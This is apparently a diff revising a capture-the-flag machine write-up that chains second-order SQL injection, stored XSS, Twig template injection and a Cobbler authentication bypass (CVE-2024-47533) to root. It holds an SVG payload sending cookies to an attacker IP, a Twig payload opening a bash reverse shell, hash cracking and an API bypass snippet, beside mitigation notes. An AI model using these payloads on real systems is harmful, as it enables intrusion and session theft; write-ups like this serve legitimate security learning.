@@ -17,7 +17,7 @@ tags: [linux, sqli, second-order, xss, twig, ssti, cobbler, cve-2024-47533]
 
 ## TL;DR
 
-Debian 12 behind two vhosts. A **second-order SQLi** in the voting app allows `LOAD_FILE` and reads Apache's vhost config, which reveals an internal proxy to **Cobbler** on `127.0.0.1:25151`. A **stored XSS** hands over the admin session, the deploy panel renders **Twig** with a user-supplied field (**SSTI**) for a shell, the database bcrypt hash opens SSH as `cobble`, and **CVE-2024-47533** finishes as root through Cobbler's authentication bypass.
+Debian 12 behind two vhosts. A **second-order SQLi** in the voting app allows `LOAD_FILE` and reads Apache's vhost config, which reveals an internal proxy to **Cobbler** on `127.0.0.1:25151`. A **stored XSS** runs code in the admin's browser — the cookie is `HttpOnly`, so the session is **used**, not stolen —, the deploy panel renders **Twig** with the deployment description (**SSTI**) for a shell, the database hash opens SSH as `cobble`, and **CVE-2024-47533** finishes as root: Cobbler's authentication bypass plus a **Cheetah** template in the `autoinstall`.
 
 ## Recon
 
@@ -56,11 +56,11 @@ The sanitiser is bypassed with an SVG in another field:
 <svg/onload=fetch('http://<IP>:8000/'+document.cookie)>
 ```
 
-Some writeups use a variant where the admin loads a page with `phpinfo()` and the cookie is printed in the response, with no external server. With the admin's `PHPSESSID` the `deploy` panel opens.
+The cookie is **`HttpOnly`**: `document.cookie` never sees it, so the fetch to an attacker server fails. The working route forces the admin's browser to render an attacker `phpinfo()` page and reads the `PHPSESSID` printed in that response. With it the `deploy` panel opens.
 
 ### 3. Twig SSTI
 
-The panel renders a user-editable field (the first name in user management) as a Twig template:
+The panel renders the **deployment description** as a Twig template; the first name in user management is the variant other writeups document:
 
 ```text
 {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'")}}
@@ -73,7 +73,7 @@ nc -lvnp 4444
 
 ## Lateral movement
 
-The application database stores bcrypt hashes; `cobble`'s falls to a dictionary and is reused over SSH:
+The application database stores `cobble`'s hash, and writeups disagree on the algorithm (bcrypt in some, a SHA-256 leaked through the SSTI in others). The value is reused over SSH:
 
 ```bash
 hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
@@ -98,7 +98,7 @@ curl -s -H 'Content-Type: text/xml' \
 import xmlrpc.client
 srv = xmlrpc.client.ServerProxy("http://127.0.0.1:25151/cobbler_api", allow_none=True)
 tok = srv.login("", -1)
-# create a distro/profile and trigger the action that executes the command
+# with the token: write a Cheetah autoinstall template and trigger profile generation
 ```
 
 ## Evidence (redacted)
@@ -113,7 +113,7 @@ tok = srv.login("", -1)
 - **Second-order SQLi**: the payload is stored clean and fires when read back; WAFs that only inspect the inbound request miss it.
 - `LOAD_FILE` remains available when the DB user holds `FILE`: Apache's configuration is a map of the internal network.
 - **SSTI** in a field that looks cosmetic (a user's first name) is RCE.
-- **CVE-2024-47533 is an authentication bypass**, not command injection: log in with `""`/`-1` and drive Cobbler's legitimate APIs.
+- **CVE-2024-47533 is an authentication bypass**, not command injection: log in with `""`/`-1` and drive Cobbler's legitimate APIs; code runs when the **Cheetah** `autoinstall` template renders during profile generation.
 - Mitigation: prepared statements on every read, `FILE` revoked, Twig without `registerUndefinedFilterCallback`, Cobbler patched and `cobblerd` behind real authentication.
 
 ## Detection and mitigation
